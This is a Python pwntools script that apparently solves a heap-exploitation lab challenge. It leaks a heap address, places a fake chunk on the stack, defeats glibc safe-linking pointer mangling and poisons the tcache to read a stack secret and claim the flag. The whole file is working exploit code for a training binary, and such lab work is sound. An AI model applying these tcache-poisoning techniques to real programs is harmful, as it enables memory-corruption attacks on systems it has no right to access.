# Safely Stack Summoning
import pwn
from dojotool import find_challenge, tee


def one_round(io: pwn.process) -> None:
    def protect_ptr(pos: int, ptr: int) -> int:
        return (pos >> 12) ^ ptr

    def reveal_ptr(pos: int, ptr: int) -> int:
        return protect_ptr(pos, ptr)

    def read_puts(idx):
        io.sendline(b"puts %d" % idx)
        io.recvuntil(b"Data: ")
        return io.recvline(False)

    def read_int8(idx):
        return pwn.u64(read_puts(idx).ljust(8, b"\x00")[:8])

    rbp_scanf = 0x190 # stack_scanf ptr
    rbp_free = 0x150 # stack_free ptr
    rbp_secret = 0xAB # send_flag cmd target
    if "hard" in str(io.executable):
        rbp_scanf = 0x190
        rbp_free = 0x150
        rbp_secret = 0xA2

    offset_tofree = rbp_scanf - rbp_free  # offset from scanf to free ptr

    io.sendline(b"malloc 0 16")
    io.sendline(b"free 0")
    addr_heap = read_int8(0) << 12
    pwn.info(f"addr_heap: {hex(addr_heap)}")

    io.sendline(b"stack_scanf")
    io.sendline(
        pwn.flat(
            {
                offset_tofree - 0x10: 0x00,  # prev_size
                offset_tofree - 0x08: 0x21,  # size (0x20 | PREV_INUSE)
            }
        ),
    )

    io.sendline(b"malloc 0 16")
    io.sendline(b"stack_free")
    io.sendline(b"free 0")  # slot 0 now contain the address of rbp_free

    addr_free = read_int8(0)
    addr_free = reveal_ptr(addr_heap, addr_free)
    pwn.info(f"addr_free: {hex(addr_free)}")
    addr_slot = addr_free + (rbp_free - 0x210)
    pwn.info(f"addr_slot: {hex(addr_slot)}")
    addr_sect = addr_free + (rbp_free - rbp_secret)
    pwn.info(f"addr_sect: {hex(addr_sect)}")

    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")
    io.sendline(b"free 0")
    io.sendline(b"free 1")

    io.sendline(b"scanf 1")
    io.sendline(pwn.p64(protect_ptr(addr_free, addr_slot)))
    io.sendline(b"malloc 0 16")
    io.sendline(b"malloc 1 16")  # slot 1 points to address of slot 0

    io.sendline(b"scanf 1")  # overwrite slot 0's content to point to secret
    io.sendline(pwn.p64(addr_sect))
    secret = read_puts(0)
    pwn.success(secret.decode())  # or rerun with this secret

    io.sendline(b"send_flag")
    io.sendline(secret)
    io.sendline(b"quit")


def ctf() -> None:
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        tee(io)
        try:
            one_round(io)
            io.recvrepeat()
        except Exception:
            io.recvrepeat(0.5)
            raise


if __name__ == "__main__":
    ctf()
